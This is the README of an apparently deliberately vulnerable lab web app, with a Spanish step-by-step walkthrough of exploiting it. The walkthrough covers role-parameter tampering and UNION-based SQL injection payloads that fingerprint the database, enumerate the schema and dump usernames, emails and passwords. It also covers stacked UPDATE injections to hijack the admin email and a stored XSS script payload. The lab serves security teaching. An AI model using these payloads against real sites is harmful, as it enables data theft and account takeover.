Python version 3.12.3

Install dependencies: pip3 install -r requirements.txt

Run: py app.py

---

# Procedimiento

### 1. Entrar a la ruta /posts y cambiar el query param role por 'admin', lo cual habilita un campo filtro
### 2. Inyectar sql en este campo filtro.
   #### El objetivo es encontrar información sobre las db, tablas, columnas, como no sabemos que motor de BD utiliza, probamos con las sentencias SQL para distintos motores, para encontrar el motor que utiliza.
   ##### MySQL
   - ' UNION ALL SELECT table_schema, table_name, engine, version, row_format FROM information_schema.tables WHERE table_type = 'BASE TABLE' ORDER BY table_schema, table_name;--
   - ' UNION ALL SELECT version();--
   - ' UNION ALL SELECT schema_name FROM information_schema.schemata;--

   ##### MSSQL
   - ' UNION ALL SELECT name FROM master.dbo.sysdatabases;--
   - ' UNION ALL SELECT name FROM master.sys.databases;--
   - ' UNION ALL SELECT name FROM sys.dm_os_sys_info;--
   - ' UNION ALL SELECT name FROM dbo.dm_os_sys_info;--

   ##### SQLite
   - ' UNION ALL select sqlite_version();--
   #### En este ultimo intento vemos que el error refiere a cantidad de columnas que retorna, por lo que inferimos que algo retorno del select, entonces estamos ante un motor sqlite.

   #### Acá probamos con una sola columna, nos dicen que faltan más y vamos probando con más hasta que encontramos que son 3, ya que cambia de error
   - ' UNION ALL SELECT name FROM sqlite_master WHERE type='table'--
   - ' UNION ALL SELECT name, name as bla FROM sqlite_master WHERE type='table'--
   - ' UNION ALL SELECT name, name as bla, name as ble FROM sqlite_master WHERE type='table'--
   #### Acá nos dice que hay un error que dice que necesitamos un valor entero, entonces vamos probando columna por columna para ver cual es la columna que debe ser un entero
   - ' UNION ALL SELECT name, name as bla, 11 as ble FROM sqlite_master WHERE type='table'--
   - ' UNION ALL SELECT name, 77 as bla, 11 as ble FROM sqlite_master WHERE type='table'--
   - ' UNION ALL SELECT 66, name as bla, 11 as ble FROM sqlite_master WHERE type='table'--

   #### Ahora, teniendo el nombre de la tabla, queremos descubrir los nombres de los campos (users, posts y comments)
   - ' UNION ALL SELECT 20, sql, '-' FROM sqlite_schema where name = 'users' --
   - ' UNION ALL SELECT 20, sql, '-' FROM sqlite_schema where name = 'posts' --
   - ' UNION ALL SELECT 20, sql, '-' FROM sqlite_schema where name = 'comments' --

   #### Con toda la informacion previa, podemos ver la información de las tablas
   - ' UNION ALL SELECT id, id || ' ' || username || ' ' || email || ' ' || role, password FROM 'users' --
   - ' UNION ALL SELECT id, title, content FROM 'posts' --
   - ' UNION ALL SELECT id, content, post_id FROM 'comments' --

   #### En el mismo campo, intentamos buscar la forma de cambiar el mail, pero no nos permite, ya que no permite la ejecucion de mas de una query a la vez
   - s' ; UPDATE users SET email='my_email' WHERE username='admin'; --

   #### Buscamos otros campos donde poder injectar sql. Encontramos que los posts tienen un campo texto, que permite esta injeccion
   - s' ; UPDATE users SET email='`<un_mail>`' WHERE username='admin'; --

### 3. ' UNION ALL SELECT 10 as id, sql AS content, '-' as title from sqlite_schema where name = 'users' --
### 4. Logeado como admin, crear un post con contenido malicioso. Ejemplo de contenido: <script>alert('alerta xss')</script>
